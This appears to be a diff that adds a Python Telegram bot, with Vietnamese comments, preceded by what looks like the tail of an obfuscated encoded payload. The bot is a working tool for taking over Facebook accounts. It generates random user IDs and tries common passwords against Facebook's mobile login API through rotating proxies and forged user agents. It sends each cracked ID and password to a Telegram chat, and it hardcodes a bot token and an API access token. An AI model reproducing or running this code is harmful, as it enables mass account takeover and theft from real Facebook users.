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'))
+import os
+import asyncio
+import random
+import uuid
+import requests
+from concurrent.futures import ThreadPoolExecutor
+from telegram import Update
+from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.constants import ParseMode
+
+# ---------- Cấu hình ----------
+TOKEN="8377931268:AAGkN2B6OVjamYf7kskT0wgoM9S2Hp9waUQ"
+
+# ---------- Biến toàn cục ----------
+loop_count = 0
+oks = []
+stop_flag = False
+scan_task = None
+proxy_pool = []          # danh sách proxy sống
+proxy_lock = asyncio.Lock()  # tránh đọc/ghi đồng thời
+
+# ---------- Hàm kiểm tra proxy ----------
+def check_proxy(proxy_str):
+    """Trả về True nếu proxy sống."""
+    try:
+        proxies = {
+            "http": f"http://{proxy_str}",
+            "https": f"http://{proxy_str}",
+        }
+        # Kiểm tra bằng httpbin (nhẹ, trả về IP)
+        r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
+        return r.status_code == 200
+    except:
+        return False
+
+async def load_live_proxies():
+    """Đọc proxy.txt, kiểm tra và cập nhật proxy_pool."""
+    global proxy_pool
+    async with proxy_lock:
+        if not os.path.exists("proxy.txt"):
+            proxy_pool = []
+            return 0
+
+        with open("proxy.txt", "r") as f:
+            raw = [line.strip() for line in f if line.strip()]
+
+        if not raw:
+            proxy_pool = []
+            return 0
+
+        # Kiểm tra đồng thời bằng ThreadPoolExecutor
+        loop = asyncio.get_event_loop()
+        with ThreadPoolExecutor(max_workers=20) as pool:
+            results = await asyncio.gather(
+                *[loop.run_in_executor(pool, check_proxy, p) for p in raw]
+            )
+
+        live = [raw[i] for i, ok in enumerate(results) if ok]
+        proxy_pool = live
+        return len(live)
+
+# ---------- Hàm login (giữ nguyên logic method A) ----------
+def window1():
+    """Random User‑Agent giả Windows."""
+    aV = str(random.choice(range(10, 20)))
+    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'5{bx}.{bV}'
+    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'5{cx}.{cV}'
+    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
+    latest_build = random.randint(6000, 9000)
+    latest_patch = random.randint(100, 200)
+    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
+    return random.choice([A, B, C, D])
+
+def creationyear(uid):
+    """Đoán năm tạo Facebook từ UID."""
+    if len(uid) == 15:
+        if uid.startswith('1000000000'): return '2009'
+        if uid.startswith('100000000'): return '2009'
+        if uid.startswith('10000000'): return '2009'
+        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
+        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
+        if uid.startswith('100001'): return '2010'
+        if uid.startswith(('100002','100003')): return '2011'
+        if uid.startswith('100004'): return '2012'
+        if uid.startswith(('100005','100006')): return '2013'
+        if uid.startswith(('100007','100008')): return '2014'
+        if uid.startswith('100009'): return '2015'
+        if uid.startswith('10001'): return '2016'
+        if uid.startswith('10002'): return '2017'
+        if uid.startswith('10003'): return '2018'
+        if uid.startswith('10004'): return '2019'
+        if uid.startswith('10005'): return '2020'
+        if uid.startswith('10006'): return '2021'
+        if uid.startswith('10009'): return '2023'
+        if uid.startswith(('10007','10008')): return '2022'
+        return ''
+    elif len(uid) in (9,10): return '2008'
+    elif len(uid) == 8: return '2007'
+    elif len(uid) == 7: return '2006'
+    elif len(uid) == 14 and uid.startswith('61'): return '2024'
+    else: return ''
+
+def attempt_login(uid, proxy_str=None):
+    """Thử đăng nhập method A. Trả (uid, pass, year) nếu OK, else None."""
+    global loop_count, oks
+    session = requests.Session()
+    # Thiết lập proxy nếu có
+    if proxy_str:
+        session.proxies = {
+            "http": f"http://{proxy_str}",
+            "https": f"http://{proxy_str}",
+        }
+    try:
+        for pw in ('123456', '1234567', '12345678', '123456789'):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            headers = {
+                'User-Agent': window1(),
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': '25227',
+                'X-FB-SIM-HNI': '29752',
+                'X-FB-Connection-Type': 'MOBILE.LTE',
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
+                'x-fb-device-group': '5120',
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
+            }
+            res = session.post(
+                'https://b-graph.facebook.com/auth/login',
+                data=data,
+                headers=headers,
+                allow_redirects=False
+            ).json()
+            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
+                year = creationyear(uid)
+                loop_count += 1
+                oks.append(uid)
+                return (uid, pw, year)
+        loop_count += 1
+    except Exception:
+        loop_count += 1
+    return None
+
+# ---------- Vòng quét vô hạn (nền) ----------
+async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
+    global stop_flag, loop_count, oks, proxy_pool
+    executor = ThreadPoolExecutor(max_workers=30)
+    batch_size = 1000
+    star = '10000'
+
+    while not stop_flag:
+        # Kiểm tra proxy pool, nếu rỗng thì tải lại
+        if not proxy_pool:
+            count = await load_live_proxies()
+            if count == 0:
+                await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy.")
+            else:
+                await context.bot.send_message(chat_id, f"🔄 Đã nạp {count} proxy sống.")
+
+        # Tạo batch UID ngẫu nhiên
+        ids = []
+        for _ in range(batch_size):
+            suffix = str(random.randint(1000000000, 1999999999))
+            uid = star + suffix
+            ids.append(uid)
+
+        await context.bot.send_message(
+            chat_id,
+            f"> 🔄 Đang quét đợt mới...\n> Tổng loop: {loop_count}\n> OK: {len(oks)}",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+
+        # Lấy proxy ngẫu nhiên cho mỗi UID
+        loop = asyncio.get_event_loop()
+        tasks = []
+        for uid in ids:
+            proxy = random.choice(proxy_pool) if proxy_pool else None
+            tasks.append(loop.run_in_executor(executor, attempt_login, uid, proxy))
+
+        results = await asyncio.gather(*tasks)
+
+        for res in results:
+            if res:
+                uid, pw, year = res
+                # Gửi tin nhắn đẹp với quoteblock
+                msg = (
+                    f"> Tiền về sếp ơi\n"
+                    f"> Via: {year}\n"
+                    f"> UID: `{uid}`\n"
+                    f"> Pass: `{pw}`\n"
+                    f"> Chi tiết: https://facebook.com/{uid}"
+                )
+                await context.bot.send_message(chat_id, msg, parse_mode=ParseMode.MARKDOWN_V2)
+
+        await asyncio.sleep(2)
+
+    executor.shutdown(wait=False)
+    await context.bot.send_message(chat_id, "⏹️ Đã dừng quét.")
+
+# ---------- Lệnh Telegram ----------
+async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global stop_flag, scan_task
+    chat_id = update.effective_chat.id
+    if scan_task and not scan_task.done():
+        await update.message.reply_text("⚠️ Bot đang quét rồi.")
+        return
+
+    stop_flag = False
+    application = context.application
+    scan_task = application.create_task(scan_loop_wrapper(chat_id, context))
+    await update.message.reply_text("✅ Bắt đầu quét vô hạn (method A). Dùng /stop để dừng.")
+
+async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global stop_flag, scan_task
+    stop_flag = True
+    if scan_task:
+        scan_task.cancel()
+        scan_task = None
+    await update.message.reply_text("🛑 Đang dừng...")
+
+async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global loop_count, oks, proxy_pool
+    msg = (
+        f"> 📊 Đã quét: {loop_count} UID\n"
+        f"> ✅ Tài khoản OK: {len(oks)}\n"
+        f"> 🌐 Proxy sống hiện có: {len(proxy_pool)}"
+    )
+    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)
+
+async def ipprx_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Lọc proxy sống và gửi file."""
+    await update.message.reply_text("🔎 Đang kiểm tra proxy... Vui lòng đợi.")
+    count = await load_live_proxies()
+    if count == 0:
+        await update.message.reply_text("⚠️ Không có proxy sống.")
+        return
+
+    # Ghi proxy sống ra file tạm
+    with open("live_proxies.txt", "w") as f:
+        for p in proxy_pool:
+            f.write(p + "\n")
+
+    # Gửi file
+    with open("live_proxies.txt", "rb") as f:
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=f,
+            filename="live_proxies.txt",
+            caption=f"🌐 Danh sách {count} proxy sống đã lọc."
+        )
+
+async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_text = (
+        "📋 *Danh sách lệnh*\n"
+        "> /scan \\- Bắt đầu quét vô hạn\n"
+        "> /stop \\- Dừng quét\n"
+        "> /status \\- Xem tiến độ\n"
+        "> /ipprx \\- Lọc và gửi file proxy sống\n"
+        "> /help \\- Hiển thị trợ giúp này"
+    )
+    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN_V2)
+
+# ---------- Main ----------
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("scan", start_scan))
+    app.add_handler(CommandHandler("stop", stop_scan))
+    app.add_handler(CommandHandler("status", status_cmd))
+    app.add_handler(CommandHandler("ipprx", ipprx_cmd))
+    app.add_handler(CommandHandler("help", help_cmd))
+
+    print("🤖 Bot đã khởi động...")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
